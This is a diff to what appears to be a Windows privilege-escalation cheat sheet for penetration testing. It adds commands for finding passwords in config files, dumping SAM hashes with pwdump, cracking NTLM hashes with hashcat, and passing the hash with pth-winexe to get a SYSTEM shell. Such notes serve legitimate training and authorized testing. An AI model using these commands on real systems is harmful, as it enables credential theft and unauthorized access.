@@ -259,6 +259,47 @@ winexe -U 'admin%password123' --system //<ip> cmd.exe
 ```
 runas /savecred /user:admin C:\PrivEsc\reverse.exe
 ```
+### Configuration Files
+```
+dir /s *pass* == *.config
+findstr /si password *.xml *.ini *.txt
+```
+
+1. winpeas results under ```looking for possible known files that can contain creds```
+2. ```Unattend.xml``` is one good file to search for
+3. decode the password with ```echo "<hash>" | base64 -d```
+
+### SAM
+1. Usually SAM file will locate at this 2 possible location
+```
+# files are locked when Windows is running
+C:\Windows\System32\config
+
+# possible backup location
+C:\Windows\Repair
+C:\Windows\System32\config\RegBack
+```
+2. winpeas results under ```looking for possible known files that can contain creds``` see there is any possible ```SAM``` file.
+3. Copy the files into kali linux
+4. Can consider using tools such as ```samdump``` or ```pwdump```
+```
+python2 pwdump.py /tools/SYSTEM /tools/SAM
+```
+ 5. Use the 2nd part of the password as it is the NTLM hash.
+ ``` User:500:<1st part hash>:<2nd part hash>:::```
+ 6. If you see it starts with ```31d6c``` it means its an empty string and most likely it has no password
+ 7. Can try cracking with hashcat
+ ```
+ hashcat -m 1000 --force <hash> <wordlist>
+ ```
+ 8. use ```winexe``` to spawn shell
+
+### Passing the Hash
+1. Gain NTLM hash, can refer to SAM section
+2. run ```pth-winexe```
+``` pth-winexe -U '<user>%<part1 and part2 hash>' //<kali ip> cmd.exe```
+3. or if you wan system shell
+``` pth-winexe --system -U '<user>%<part1 and part2 hash>' //<kali ip> cmd.exe```
 
 
 ## Kernel Exploit (Last resort)
